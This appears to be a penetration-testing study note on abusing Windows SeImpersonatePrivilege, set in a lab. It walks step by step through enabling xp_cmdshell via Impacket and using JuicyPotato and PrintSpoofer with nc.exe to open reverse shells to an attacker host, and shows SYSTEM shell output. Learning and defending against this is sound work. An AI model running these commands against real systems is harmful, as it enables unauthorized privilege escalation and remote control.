# SeImpersonate 
The `SeImpersonatePrivilege` is a powerful security privilege in Microsoft Windows that allows a process to impersonate the security context of another user.

* `SeImpersonatePrivilege` allows a process to perform actions on behalf of another user
* Crucial for scenarios where a server application, such as a web server or a remote desktop service, needs to act on behalf of a client to access resources or perform operations

## How Does Impersonation Work?
1. Token Manipulation
* When a process has `SeImpersonatePrivilege`, it can create a token that represents the security context of another user
* This token can be attached to a thread, allowing that thread to perform actions as if it were the user associated with the token

2. Access Rights
* The thread running with an impersonation token can access resources and perform actions according to the permissions granted to the user represented by the token, rather than the permissions of the process that created the thread

## SeImpersonate Example using JuicyPotato
**Gaining a Foothold**
* An attacker gains access to an SQL server using a privileged SQL user account
* Attacker can execute commands and queries on the SQL server with high privileges

**Windows Authentication**
* SQL server and an IIS web server are configured to use Windows Authentication
* Allows users to log in to these services using Windows Credentials

**Resource Access Requirements**
* SQL server and IIS may need to access additional resources - such as file shares on a network
* To do this, they need to act on behalf of the client that established the connection

In this scenario, the SQL Service service account is running in the context of the default mssqlserver account. Imagine we have achieved command execution as this user using xp_cmdshell using a set of credentials obtained in a logins.sql file on a file share using the Snaffler tool.

### Connecting with MSSQLClient.py
* Using credentials 
* Connect to SQL server instance and confirm our privileges
* Use mssqlclient.py from Impacket toolkit

<pre>SQL > mssqlclient.py sql_dev@10.129.43.30 -windows-auth</pre>

### Enabling xp_cmdshell
* Enable the `xp_cmdshell` stored procedure to run operating system commands
* We can do this via Impacket MSSQL shell by typing `enable_xp_cmdshell`

<pre>SQL> enable_xp_cmdshell</pre>

* Confirm we are indeed running in the context of an SQL service account

<pre>SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01</pre>

### Check Account Privileges
<pre>SQL> xp_cmdshell whoami /priv

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</pre>

* `SeImpersonatePrivilege` is listed
* Privilege can be used to impersonate a privileged account such as NT AUTHORITY\SYSTEM
* JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges 

### Escalating Privileges using JuicyPotato
* Download JuicyPotato.exe binary
* Upload JuicyPotato.exe and nc.exe to the target server
* Setup a netcat listener on port 8443 and execute the command below

<pre>SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *</pre>

`-l 53375` : Specifies the COM server listening port  
`-p c:\windows\system32\cmd.exe` : Program to launch (cmd.exe)  
`-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` : Arguments passed to `cmd.exe` > start `nc.exe` to create a reverse shell to local attacking machine on port 8443  
`-t *` : Tells JuicyPotato to try both `CreateProcessWithToken` and `CreateProcessAsUser` functions

### Catching SYSTEM Shell
<pre>sudo nc -lnvp 8443</pre>

<pre>C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01</pre>

## PrintSpoofer and RoguePotato
* JuicyPotato does not work on Windows Server 2019 and Windows 10 build 1809 onwards
* PrintSpoofer and RoguePotato can be used to gain the same privileges and `NT AUTHORITY\SYSTEM` level access

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

### Escalating Privileges using PrintSpoofer
* Use the tool to spawn a SYSTEM process in current console and interact with it
* Connect with mssqlclient.py and use tool with the -c argument to execute
* Use nc.exe to spawn a reverse shell
* Netcat listener waiting on port 8443

<pre>SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"</pre>

### Catching Reverse Shell as SYSTEM
<pre>nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system</pre>
